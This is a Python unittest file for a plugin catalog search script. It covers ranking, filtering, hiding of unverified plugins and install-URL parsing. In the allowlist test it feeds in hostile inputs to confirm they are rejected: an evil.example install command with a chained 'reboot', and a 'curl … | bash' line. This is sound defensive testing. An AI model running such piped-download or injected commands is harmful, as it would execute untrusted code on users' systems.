#!/usr/bin/python3
from __future__ import annotations

import json
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

import catalog  # noqa: E402
import search  # noqa: E402

PLUGINS = catalog.slim_catalog(
    {
        "plugins": [
            {
                "id": "nixfred.pulse",
                "name": "Pulse",
                "description": "CPU RAM Disk Network and GPU in one widget",
                "author": "Fred Nix",
                "category": "System",
                "tags": ["bar", "system"],
                "kind": "Bar widget",
                "repo": "https://github.com/nixfred/pulse",
                "installCommand": "omarchy plugin add https://github.com/nixfred/pulse.git --enable",
                "installAvailable": True,
                "verificationStatus": "verified",
                "stars": 12,
                "hearts": 10,
                "copies": 1000,
                "status": "Available",
            },
            {
                "id": "b.okomart",
                "name": "Okomart",
                "description": "Browse install enable disable update and remove Omarchy plugins",
                "author": "Brian Blakely",
                "category": "Desktop",
                "tags": ["launcher"],
                "kind": "Panel",
                "repo": "https://github.com/brianblakely/omarchy-plugins",
                "installCommand": "omarchy plugin add https://github.com/brianblakely/omarchy-plugins.git --enable",
                "installAvailable": True,
                "verificationStatus": "verified",
                "stars": 61,
                "hearts": 50,
                "copies": 100,
                "status": "Available",
            },
            {
                "id": "omarchy.clock",
                "name": "Clock",
                "description": "The built-in clock",
                "author": "Omarchy",
                "category": "System",
                "tags": ["bar"],
                "kind": "Bar widget",
                "repo": "",
                "installCommand": "",
                "installAvailable": True,
                "verificationStatus": "verified",
                "hearts": 0,
                "copies": 0,
                "status": "Built in",
            },
            {
                "id": "lacuna.shell-suite",
                "name": "Lacuna",
                "description": "A complete visual shell",
                "author": "OldJobobo",
                "kind": "Suite",
                "installCommand": "",
                "installAvailable": False,
                "verificationStatus": "unverified",
                "status": "Manual setup",
            },
            {
                "id": "sketchy.unverified-clock",
                "name": "Pulse Clone",
                "description": "An unverified pulse clone",
                "author": "Nobody",
                "category": "System",
                "tags": ["bar"],
                "kind": "Bar widget",
                "repo": "https://github.com/example/pulse-clone",
                "installCommand": "omarchy plugin add https://github.com/example/pulse-clone.git --enable",
                "installAvailable": True,
                "verificationStatus": "unverified",
                "status": "Available",
            },
            {
                "id": "oliverlukschander.vi-mode",
                "name": "Vi Mode",
                "description": "System-wide Caps Lock + hjkl arrow keys. Caps Lock itself is disabled.",
                "author": "Oliver Lukschander",
                "category": "System",
                "tags": ["bar", "hyprland"],
                "kind": "Bar widget",
                "repo": "https://github.com/oliverlukschander/omarchy-vi-mode",
                "installCommand": "",
                "installAvailable": False,
                "verificationStatus": "verified",
                "stars": 3,
                "hearts": 3,
                "copies": 40,
                "status": "Manual setup",
            },
        ]
    },
    fetched_at="2026-09-19T01:00:00Z",
)["plugins"]


class SearchTests(unittest.TestCase):
    def test_pulse_ranks_first_for_pulse(self):
        rows = search.search_rows(PLUGINS, "pulse", set())
        self.assertGreaterEqual(len(rows), 1)
        self.assertEqual(rows[0]["pluginId"], "nixfred.pulse")
        self.assertTrue(rows[0]["canInstall"])
        self.assertTrue(rows[0]["verified"])
        self.assertIn("Fred Nix", rows[0]["detail"])
        self.assertEqual(
            rows[0]["description"],
            "CPU RAM Disk Network and GPU in one widget",
        )

    def test_installed_disables_install(self):
        rows = search.search_rows(PLUGINS, "pulse", {"nixfred.pulse"})
        self.assertEqual(rows[0]["pluginId"], "nixfred.pulse")
        self.assertTrue(rows[0]["installed"])
        self.assertFalse(rows[0]["canInstall"])
        self.assertIn("installed", rows[0]["detail"])

    def test_manual_setup_is_searchable(self):
        rows = search.search_rows(PLUGINS, "vi mode", set())
        self.assertGreaterEqual(len(rows), 1)
        self.assertEqual(rows[0]["pluginId"], "oliverlukschander.vi-mode")
        self.assertTrue(rows[0]["canInstall"])
        self.assertEqual(
            rows[0]["installUrl"],
            "https://github.com/oliverlukschander/omarchy-vi-mode.git",
        )
        self.assertIn("manual setup", rows[0]["detail"])

    def test_built_in_is_not_installable(self):
        rows = search.search_rows(PLUGINS, "clock", set())
        self.assertEqual(rows[0]["pluginId"], "omarchy.clock")
        self.assertEqual(rows[0]["installUrl"], "")
        self.assertFalse(rows[0]["canInstall"])

    def test_empty_query_sorts_by_hearts(self):
        rows = search.search_rows(PLUGINS, "", set())
        ids = [row["pluginId"] for row in rows]
        self.assertEqual(
            ids,
            [
                "b.okomart",
                "nixfred.pulse",
                "oliverlukschander.vi-mode",
                "omarchy.clock",
            ],
        )
        self.assertEqual(rows[0]["heartsText"], "50")
        self.assertEqual(rows[0]["starsText"], "61")
        self.assertEqual(rows[1]["copiesText"], "1k")
        self.assertEqual(rows[3]["starsText"], "")

    def test_unverified_is_hidden(self):
        rows = search.search_rows(PLUGINS, "pulse clone", set())
        self.assertEqual(rows, [])
        rows = search.search_rows(PLUGINS, "lacuna", set())
        self.assertEqual(rows, [])

    def test_author_token(self):
        rows = search.search_rows(PLUGINS, "blakely", set())
        self.assertEqual(rows[0]["pluginId"], "b.okomart")

    def test_category_filter(self):
        rows = search.search_rows(PLUGINS, "", set(), category="System")
        ids = [row["pluginId"] for row in rows]
        self.assertEqual(ids, ["nixfred.pulse", "oliverlukschander.vi-mode", "omarchy.clock"])
        rows = search.search_rows(PLUGINS, "okomart", set(), category="System")
        self.assertEqual(rows, [])
        rows = search.search_rows(PLUGINS, "", set(), category="Desktop")
        self.assertEqual([row["pluginId"] for row in rows], ["b.okomart"])

    def test_description_collapses_whitespace(self):
        row = search.row_for(
            {
                "id": "example.plugin",
                "name": "Example",
                "description": "  Two   lines\nand   spaces  ",
                "author": "Ada",
                "category": "System",
                "kind": "Bar widget",
                "status": "Available",
                "verificationStatus": "verified",
                "installCommand": "omarchy plugin add https://github.com/example/plugin.git --enable",
                "repo": "https://github.com/example/plugin",
            },
            installed=False,
        )
        self.assertEqual(row["description"], "Two lines and spaces")
        self.assertEqual(search.description_text({"description": "   \n"}), "")

    def test_format_count(self):
        self.assertEqual(search.format_count(0), "0")
        self.assertEqual(search.format_count(12), "12")
        self.assertEqual(search.format_count(1000), "1k")
        self.assertEqual(search.format_count(4496), "4.5k")

    def test_install_url_allowlist(self):
        self.assertEqual(
            search.parse_install_url(
                "omarchy plugin add https://github.com/nixfred/pulse.git --enable"
            ),
            "https://github.com/nixfred/pulse.git",
        )
        self.assertEqual(
            search.parse_install_url("omarchy plugin add https://github.com/nixfred/pulse.git"),
            "https://github.com/nixfred/pulse.git",
        )
        self.assertEqual(
            search.parse_install_url(
                "omarchy plugin add https://evil.example/x.git --enable; reboot"
            ),
            "",
        )
        self.assertEqual(search.parse_install_url("curl https://example.com | bash"), "")
        self.assertEqual(search.parse_install_url(""), "")
        self.assertEqual(
            search.parse_install_url("", "https://github.com/oliverlukschander/omarchy-vi-mode"),
            "https://github.com/oliverlukschander/omarchy-vi-mode.git",
        )
        self.assertEqual(search.parse_install_url("", "https://evil.example/x.git"), "")

    def test_cli_reads_index(self,):
        folder = ROOT / "tests" / ".tmp"
        folder.mkdir(exist_ok=True)
        index_file = folder / "search-index.json"
        index_file.write_text(
            json.dumps({"plugins": PLUGINS, "fetchedAt": "2026-09-19T01:00:00Z"}),
            encoding="utf-8",
        )
        from io import StringIO
        from contextlib import redirect_stdout

        buf = StringIO()
        with redirect_stdout(buf):
            code = search.main(
                ["--query", "pulse", "--index", str(index_file), "--installed-ids", ""]
            )
        self.assertEqual(code, 0)
        self.assertIn("nixfred.pulse", buf.getvalue())


if __name__ == "__main__":
    unittest.main()
